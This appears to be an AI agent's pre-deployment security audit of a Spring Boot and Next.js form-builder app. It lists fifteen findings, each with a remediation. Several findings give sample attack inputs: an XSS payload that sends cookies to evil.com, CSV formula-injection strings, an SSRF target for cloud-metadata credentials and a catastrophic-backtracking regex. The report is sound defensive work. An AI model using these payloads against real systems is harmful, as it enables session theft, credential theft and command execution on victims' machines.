# Security Audit Report -- Dynamic Form Builder

**Audit Date:** 2026-04-06
**Auditor:** Security Auditor Agent
**Scope:** Full-stack application -- Spring Boot 3.2.4 backend, Next.js 14.1.3 frontend
**Classification:** Internal / Pre-deployment

---

## Executive Summary

The Dynamic Form Builder application has a **moderate-to-high risk** security posture. The codebase demonstrates several good practices -- structured DTOs with Bean Validation, soft delete, parameterized JPA queries, a global exception handler that hides internal stack traces, and public-facing API stripping of sensitive settings. However, the audit identified **2 Critical**, **4 High**, **4 Medium**, and **5 Low** severity issues that must be addressed before any production deployment.

The most urgent findings are a **Stored XSS** vulnerability via the `ContentField` component's use of `dangerouslySetInnerHTML` and a **Server-Side Request Forgery (SSRF)** vector through unvalidated webhook URLs. Both are directly exploitable and could lead to data theft or internal network scanning.

**Overall Risk Rating: HIGH**

---

## Statistics

| Severity      | Count |
|---------------|-------|
| Critical      | 2     |
| High          | 4     |
| Medium        | 4     |
| Low           | 5     |
| **Total**     | **15** |

---

## Top Priority Fixes

1. **Sanitize HTML in ContentField** -- Stored XSS via `dangerouslySetInnerHTML` (Critical)
2. **Validate webhook URLs against SSRF** -- internal network scanning possible (Critical)
3. **Add authentication and authorization** -- all endpoints are fully open (High)
4. **Sanitize CSV output against formula injection** -- data exfiltration via spreadsheet apps (High)
5. **Disable H2 console in non-dev profiles** -- database admin panel exposed (High)

---

## Critical Vulnerabilities

### CRIT-01: Stored Cross-Site Scripting (XSS) via ContentField

**Category:** Input Validation / XSS
**CWE:** CWE-79 (Improper Neutralization of Input During Web Page Generation)
**Location:** `frontend/src/components/form-renderer/fields/ContentField.tsx`, line 10
**Severity:** Critical
**CVSS Estimate:** 8.1
**Assigned to:** frontend-dev

**Description:**
The `ContentField` component renders arbitrary HTML from `field.config.html` using React's `dangerouslySetInnerHTML` with zero sanitization. A form creator can inject any HTML/JavaScript into this field. When a public user visits the form, the malicious script executes in their browser with full access to cookies, localStorage, and the DOM.

**Attack Scenario:**
1. Attacker creates a form and adds a Content field.
2. In the field's `config.html`, they set: `<img src=x onerror="fetch('https://evil.com/steal?c='+document.cookie)">`
3. Any user who opens the public form URL executes the attacker's script.
4. The attacker steals session tokens, redirects users to phishing pages, or performs actions on behalf of the victim.

**Affected Code:**
```tsx
// ContentField.tsx line 10
dangerouslySetInnerHTML={{ __html: html }}
```

**Recommended Fix:**
Install a sanitization library like DOMPurify and sanitize the HTML before rendering:

```tsx
import DOMPurify from 'dompurify';

export function ContentField({ field }: FieldProps) {
  const html = field.config?.html as string | undefined;

  if (html) {
    const sanitized = DOMPurify.sanitize(html, {
      ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br', 'ul', 'ol', 'li', 'h1', 'h2', 'h3', 'h4', 'blockquote', 'code', 'pre'],
      ALLOWED_ATTR: ['href', 'target', 'rel'],
    });
    return (
      <div
        className="prose prose-sm max-w-none"
        dangerouslySetInnerHTML={{ __html: sanitized }}
      />
    );
  }
  // ...
}
```

**References:**
- https://owasp.org/www-community/attacks/xss/
- https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html

---

### CRIT-02: Server-Side Request Forgery (SSRF) via Webhook URL

**Category:** Input Validation / SSRF
**CWE:** CWE-918 (Server-Side Request Forgery)
**Location:** `backend/src/main/java/com/formbuilder/service/impl/WebhookServiceImpl.java`, lines 34-63
**Severity:** Critical
**CVSS Estimate:** 8.6
**Assigned to:** backend-dev

**Description:**
The webhook URL is read directly from form settings (`form.getSettings().get("webhookUrl")`) and used in an HTTP request without any validation. An attacker can set this to internal network addresses (e.g., `http://169.254.169.254/latest/meta-data/` on AWS, `http://localhost:8080/api/v1/forms`, or `http://10.0.0.1/admin`) to probe internal services, read cloud metadata credentials, or attack internal systems.

Additionally, the `webhookHeaders` map is fully user-controlled, allowing injection of arbitrary HTTP headers (e.g., `Host`, `Authorization`) into outbound requests.

**Attack Scenario:**
1. Attacker creates a form and sets `webhookUrl` to `http://169.254.169.254/latest/meta-data/iam/security-credentials/`.
2. Attacker publishes the form and submits a response.
3. The backend server makes the request to the cloud metadata service and logs the result (or can be observed via timing/errors).
4. Attacker extracts cloud IAM credentials.

**Affected Code:**
```java
// WebhookServiceImpl.java line 34
String webhookUrl = (String) form.getSettings().get("webhookUrl");
// ... no validation ...
HttpRequest.Builder builder = HttpRequest.newBuilder()
        .uri(URI.create(url))  // line 61 -- arbitrary URL
```

**Recommended Fix:**
```java
private boolean isAllowedWebhookUrl(String url) {
    try {
        URI uri = URI.create(url);
        String scheme = uri.getScheme();
        if (!"https".equalsIgnoreCase(scheme)) {
            return false; // Enforce HTTPS only
        }
        String host = uri.getHost();
        InetAddress addr = InetAddress.getByName(host);
        if (addr.isLoopbackAddress() || addr.isLinkLocalAddress()
                || addr.isSiteLocalAddress() || addr.isAnyLocalAddress()) {
            return false; // Block internal/private IPs
        }
        return true;
    } catch (Exception e) {
        return false;
    }
}
```
Also restrict which headers can be set in `webhookHeaders` -- block security-sensitive headers like `Host`, `Authorization`, `Cookie`, etc., or use an allowlist approach.

**References:**
- https://owasp.org/www-community/attacks/Server_Side_Request_Forgery
- https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html

---

## High Risk Issues

### HIGH-01: No Authentication or Authorization

**Category:** Authentication / Authorization
**CWE:** CWE-306 (Missing Authentication for Critical Function)
**Location:** All controllers -- `FormController.java`, `SubmissionController.java`, `PublicFormController.java`
**Severity:** High
**CVSS Estimate:** 9.1 (tempered because app is pre-deployment)
**Assigned to:** backend-dev

**Description:**
No authentication or authorization mechanism exists. Every API endpoint is open to any caller. Any user can create, modify, delete, or publish any form. Any user can view, delete, or export any submission. The admin/management API (`/api/v1/forms`, `/api/v1/submissions`) is indistinguishable from the public API in terms of access control.

**Attack Scenario:**
- Any anonymous user can call `DELETE /api/v1/forms/{formId}` to delete all forms.
- Any user can call `GET /api/v1/forms/{formId}/submissions/export` to export all submission data (PII).
- Any user can modify any form's webhook URL to redirect submission data to their server.

**Recommended Fix:**
Implement Spring Security with at minimum:
1. JWT or session-based authentication for admin endpoints.
2. Ownership-based authorization (users can only manage their own forms).
3. Keep `/api/v1/public/forms/**` unauthenticated for form submission.
4. Add `@PreAuthorize` or custom security filters.

---

### HIGH-02: CSV Formula Injection in Export

**Category:** Input Validation / Injection
**CWE:** CWE-1236 (Improper Neutralization of Formula Elements in a CSV File)
**Location:** `backend/src/main/java/com/formbuilder/service/impl/SubmissionServiceImpl.java`, lines 231-243 (`toCsvRow` method)
**Severity:** High
**CVSS Estimate:** 7.3
**Assigned to:** backend-dev

**Description:**
The `toCsvRow` method properly handles CSV quoting for commas and newlines, but does not sanitize cell values that begin with formula-triggering characters (`=`, `+`, `-`, `@`, `\t`, `\r`). When a user opens the exported CSV in Excel or Google Sheets, these values are interpreted as formulas. An attacker who submits form data containing `=cmd|'/C calc'!A0` or `=HYPERLINK("https://evil.com/phish","Click here")` can execute arbitrary commands or exfiltrate data when an admin exports and opens the CSV.

**Affected Code:**
```java
private String toCsvRow(List<String> values) {
    // ... handles commas and quotes but NOT formula injection characters
    sb.append(val);
}
```

**Recommended Fix:**
Prefix cell values that start with formula characters with a single-quote or tab character:
```java
private String sanitizeCsvValue(String val) {
    if (val != null && !val.isEmpty()) {
        char first = val.charAt(0);
        if (first == '=' || first == '+' || first == '-' || first == '@'
                || first == '\t' || first == '\r') {
            val = "'" + val;  // Prefix with single quote to prevent formula interpretation
        }
    }
    return val;
}
```

**References:**
- https://owasp.org/www-community/attacks/CSV_Injection

---

### HIGH-03: H2 Database Console Enabled by Default

**Category:** Configuration / Information Exposure
**CWE:** CWE-489 (Active Debug Code)
**Location:** `backend/src/main/resources/application.yml`, lines 8-10
**Severity:** High
**CVSS Estimate:** 7.5
**Assigned to:** backend-dev

**Description:**
The H2 console is enabled in the default profile at `/h2-console`. This provides a web-based SQL administration interface. While the production profile disables it, the default (non-profile) configuration leaves it enabled. If the application is accidentally deployed without the `prod` profile, anyone can access the full database via a browser, execute arbitrary SQL, and extract or modify all data.

The datasource also uses the default `sa` user with an empty password.

**Affected Code:**
```yaml
spring:
  h2:
    console:
      enabled: true
      path: /h2-console
  datasource:
    username: sa
    password:     # empty password
```

**Recommended Fix:**
1. Set `spring.h2.console.enabled=false` in the default profile. Only enable it in an explicit `dev` profile.
2. Require a password for the H2 datasource even in dev.
3. Add Spring Security to restrict access to `/h2-console` by IP or authentication.

---

### HIGH-04: ReDoS via User-Controlled Regex Patterns

**Category:** Input Validation / Denial of Service
**CWE:** CWE-1333 (Inefficient Regular Expression Complexity)
**Location:** `backend/src/main/java/com/formbuilder/service/impl/SubmissionServiceImpl.java`, line 346; `frontend/src/lib/utils/validation.ts`, line 55
**Severity:** High
**CVSS Estimate:** 7.5
**Assigned to:** backend-dev, frontend-dev

**Description:**
Form creators can define custom validation rules with a `pattern` type containing an arbitrary regex. On the backend, this regex is compiled and executed using `Pattern.matches()` against user-submitted values. On the frontend, it is passed to `new RegExp()`. A malicious or careless form creator can craft a catastrophic backtracking regex (e.g., `^(a+)+$`) that causes exponential CPU consumption when matched against certain inputs, effectively causing a Denial of Service.

**Affected Code:**
```java
// Backend -- SubmissionServiceImpl.java line 346
case "pattern" -> {
    if (!Pattern.matches((String) ruleValue, value)) {
```
```typescript
// Frontend -- validation.ts line 55
const regex = new RegExp(String(rule.value));
```

**Recommended Fix:**
- Backend: Use a regex timeout or run the regex evaluation in a separate thread with a timeout. Alternatively, validate the regex pattern at form-creation time (reject overly complex patterns) and use `java.util.regex` with a guard or a safe regex library.
- Frontend: Same approach -- validate pattern complexity on save, or use a library that supports regex timeouts.
- Both: Consider restricting the regex syntax allowed (e.g., no nested quantifiers, no backreferences) using a pattern-of-patterns check.

---

## Medium Risk Issues

### MED-01: No Rate Limiting on Public Form Submission

**Category:** Business Logic / Availability
**CWE:** CWE-770 (Allocation of Resources Without Limits or Throttling)
**Location:** `backend/src/main/java/com/formbuilder/controller/PublicFormController.java`, line 30
**Severity:** Medium
**CVSS Estimate:** 5.3
**Assigned to:** backend-dev

**Description:**
The public submission endpoint `POST /api/v1/public/forms/{formId}/submissions` has no rate limiting. An attacker can flood the system with submissions, filling the database and causing denial of service. While a `submissionLimit` setting exists, it only caps total submissions -- not the rate.

**Recommended Fix:**
Add rate limiting using Spring's `@RateLimiter` (e.g., with Resilience4j or Bucket4j) or an API gateway. A reasonable default might be 10 submissions per IP per minute.

---

### MED-02: CORS Configuration Allows All Localhost Origins

**Category:** Configuration
**CWE:** CWE-942 (Permissive Cross-domain Policy)
**Location:** `backend/src/main/java/com/formbuilder/config/WebConfig.java`, line 13
**Severity:** Medium
**CVSS Estimate:** 5.0
**Assigned to:** backend-dev

**Description:**
The CORS policy allows `http://localhost:*` which matches any port on localhost. While acceptable for development, this must be restricted for production. There is no profile-aware CORS configuration -- the same permissive policy applies regardless of environment.

**Affected Code:**
```java
.allowedOriginPatterns("http://localhost:3000", "http://localhost:*")
```

**Recommended Fix:**
Use environment-specific CORS configuration:
```java
@Value("${app.cors.allowed-origins}")
private String[] allowedOrigins;

registry.addMapping("/api/**")
        .allowedOriginPatterns(allowedOrigins)
```
Set `app.cors.allowed-origins=https://yourdomain.com` in production.

---

### MED-03: Bulk Delete Does Not Verify Submission Ownership

**Category:** Authorization / IDOR
**CWE:** CWE-639 (Authorization Bypass Through User-Controlled Key)
**Location:** `backend/src/main/java/com/formbuilder/service/impl/SubmissionServiceImpl.java`, lines 158-163
**Severity:** Medium
**CVSS Estimate:** 6.5
**Assigned to:** backend-dev

**Description:**
The `bulkDeleteSubmissions` method verifies that the form exists but does not verify that the provided submission IDs actually belong to that form. An attacker can call `DELETE /api/v1/forms/{formA}/submissions` with a body containing submission IDs from a completely different form, deleting data they should not have access to.

**Affected Code:**
```java
public void bulkDeleteSubmissions(UUID formId, List<UUID> ids) {
    formRepository.findByIdAndDeletedAtIsNull(formId)  // only checks form exists
            .orElseThrow(() -> new ResourceNotFoundException("Form", formId));
    submissionRepository.deleteByIdIn(ids);  // deletes ANY submissions with these IDs
}
```

**Recommended Fix:**
```java
@Modifying
@Query("DELETE FROM Submission s WHERE s.id IN :ids AND s.form.id = :formId")
void deleteByIdInAndFormId(@Param("ids") List<UUID> ids, @Param("formId") UUID formId);
```

---

### MED-04: Unvalidated Settings Map Allows Arbitrary Data Injection

**Category:** Mass Assignment
**CWE:** CWE-915 (Improperly Controlled Modification of Dynamically-Determined Object Attributes)
**Location:** `backend/src/main/java/com/formbuilder/dto/request/UpdateFormRequest.java`, line 18
**Severity:** Medium
**CVSS Estimate:** 5.5
**Assigned to:** backend-dev

**Description:**
The `settings` and `theme` fields in `UpdateFormRequest` are typed as `Map<String, Object>`, accepting arbitrary key-value pairs with no schema validation. An attacker can inject unexpected keys (e.g., setting `submissionLimit` to `999999999` or adding arbitrary settings keys that might be consumed by future code). The `webhookUrl` and `webhookHeaders` in settings are especially dangerous since they control server-side outbound requests (see CRIT-02).

**Recommended Fix:**
Create a dedicated `FormSettingsRequest` DTO with explicit, validated fields instead of accepting a raw map:
```java
public record FormSettingsRequest(
    @Size(max = 100) String submitButtonText,
    @Size(max = 1000) String successMessage,
    @URL String webhookUrl,
    // ... other validated fields
) {}
```

---

## Low Risk Issues

### LOW-01: No Security Headers Configured

**Category:** Configuration
**CWE:** CWE-693 (Protection Mechanism Failure)
**Location:** Application-wide -- no security headers middleware
**Severity:** Low
**Assigned to:** backend-dev

**Description:**
The backend does not set security-related HTTP headers such as:
- `Content-Security-Policy` (CSP)
- `Strict-Transport-Security` (HSTS)
- `X-Content-Type-Options`
- `X-Frame-Options`
- `Referrer-Policy`
- `Permissions-Policy`

While Next.js provides some defaults, the backend API responses lack these entirely.

**Recommended Fix:**
Add a `SecurityHeadersFilter` or configure Spring Security's headers:
```java
http.headers(headers -> headers
    .contentSecurityPolicy(csp -> csp.policyDirectives("default-src 'self'"))
    .frameOptions(frame -> frame.deny())
    .contentTypeOptions(Customizer.withDefaults())
);
```

---

### LOW-02: Logo URL in Theme Could Enable Content Spoofing

**Category:** Input Validation
**CWE:** CWE-451 (User Interface Misrepresentation of Critical Information)
**Location:** `frontend/src/components/public/PublicFormPage.tsx`, line 93
**Severity:** Low
**Assigned to:** frontend-dev

**Description:**
The `logoUrl` from the form theme is rendered directly as an `<img src>` without validation. While this does not enable XSS (React sanitizes `src`), it allows a form creator to point the logo to an external tracking pixel or a misleading image (e.g., a bank's logo for phishing).

**Affected Code:**
```tsx
{form.theme?.logoUrl && (
  <img src={form.theme.logoUrl} alt="Logo" className="h-12 mb-6 mx-auto" />
)}
```

**Recommended Fix:**
Validate that `logoUrl` matches an allowlist of domains or enforce that logos are uploaded to a trusted storage bucket rather than linked externally.

---

### LOW-03: Submission Data Map Not Size-Limited

**Category:** Input Validation / DoS
**CWE:** CWE-400 (Uncontrolled Resource Consumption)
**Location:** `backend/src/main/java/com/formbuilder/dto/request/SubmitFormRequest.java`
**Severity:** Low
**Assigned to:** backend-dev

**Description:**
The `SubmitFormRequest.data` field is `Map<String, Object>` with no size constraint. An attacker could submit a payload with thousands of keys or very large string values, consuming memory and database storage. Spring Boot has a default max request body size (often around 1MB), but no explicit application-level limit is enforced.

**Recommended Fix:**
Add a max request body size in application configuration and validate the number of keys and value sizes server-side:
```yaml
spring:
  servlet:
    multipart:
      max-request-size: 1MB
server:
  tomcat:
    max-http-form-post-size: 1MB
```

---

### LOW-04: Frontend API Client Does Not Use Credentials Mode Consistently

**Category:** Authentication
**CWE:** CWE-352 (Cross-Site Request Forgery)
**Location:** `frontend/src/lib/api/client.ts`
**Severity:** Low (currently no auth, but relevant when auth is added)
**Assigned to:** frontend-dev

**Description:**
The API client `fetch` calls do not set `credentials: 'include'` (needed for cookie-based auth) and there is no CSRF token handling. When authentication is implemented, this will need to be addressed to prevent CSRF attacks and ensure cookies are sent cross-origin.

**Recommended Fix:**
When adding authentication, update the client to include credentials and CSRF tokens:
```typescript
const res = await fetch(url, {
  method: 'GET',
  headers: {
    'Content-Type': 'application/json',
    'X-CSRF-TOKEN': getCsrfToken(),
  },
  credentials: 'include',
});
```

---

### LOW-05: Frontend Dependency next@14.1.3 Has Known Vulnerabilities

**Category:** Dependencies
**CWE:** CWE-1395 (Dependency on Vulnerable Third-Party Component)
**Location:** `frontend/package.json`, line 33
**Severity:** Low
**Assigned to:** frontend-dev

**Description:**
Next.js 14.1.3 was released in early 2024 and has had multiple security patches since then (including Server Actions vulnerabilities and path traversal fixes in later 14.x releases). The current version should be updated to the latest 14.2.x patch release.

**Recommended Fix:**
```bash
npm install next@latest
```
Then run `npm audit` and address any additional advisories.

---

## Positive Findings

The following security practices are already properly implemented:

1. **Parameterized JPA Queries** -- All repository queries use Spring Data JPA derived methods or `@Query` with named parameters (`:param`). No string concatenation in SQL. The one native query (`countByDay`) also uses named parameters. This effectively prevents SQL injection.

2. **Global Exception Handler** -- The `GlobalExceptionHandler` catches all exceptions and returns structured error responses without leaking stack traces, class names, or internal paths. The generic `Exception` handler returns only "An unexpected error occurred."

3. **Input Validation on DTOs** -- `CreateFormRequest`, `UpdateFormRequest`, `FormFieldRequest`, and `BulkDeleteRequest` all use Bean Validation annotations (`@NotBlank`, `@Size`, `@NotNull`, `@NotEmpty`, `@Valid`).

4. **Public Settings Stripping** -- The `FormMapper.publicSettings()` method creates a whitelist copy of settings for public form responses, preventing exposure of `webhookUrl`, `webhookHeaders`, `notificationEmails`, and `submissionLimit` to public users.

5. **Soft Delete** -- Forms use soft delete (`deletedAt` timestamp) with `@SQLRestriction`, preventing accidental data loss and maintaining audit trails.

6. **Server-side Submission Validation** -- The backend performs its own validation of submitted data against field definitions (required checks, type-specific validation, option validation), not relying solely on frontend validation.

7. **UUID Primary Keys** -- All entities use UUID identifiers, making enumeration attacks infeasible.

8. **No Hardcoded Secrets** -- No API keys, passwords, or tokens are hardcoded in the frontend or backend source code (the H2 empty password is a known dev-only configuration).

---

## Recommendations for Next Phase

1. **Implement Authentication** -- Add Spring Security with JWT tokens or OAuth2. This is the single most impactful improvement and is a prerequisite for any production deployment.

2. **Add Rate Limiting** -- Implement rate limiting on public endpoints using Bucket4j or an API gateway (e.g., Kong, AWS API Gateway).

3. **Content Security Policy** -- Add CSP headers to the frontend (via `next.config.mjs`) and backend to mitigate XSS impact even if sanitization is bypassed.

4. **Audit Logging** -- Add audit logging for destructive operations (delete, publish, close) with actor identification once authentication is in place.

5. **Dependency Scanning** -- Set up automated dependency scanning (e.g., `npm audit`, OWASP Dependency-Check for Maven, or Snyk) in CI/CD.

6. **Webhook Signing** -- Add HMAC signing to webhook payloads so recipients can verify authenticity.

7. **Input Sanitization Pipeline** -- Create a reusable server-side sanitization layer for all user-provided strings (strip HTML tags, normalize unicode, enforce max lengths) applied before persistence.

---

*End of Security Audit Report*
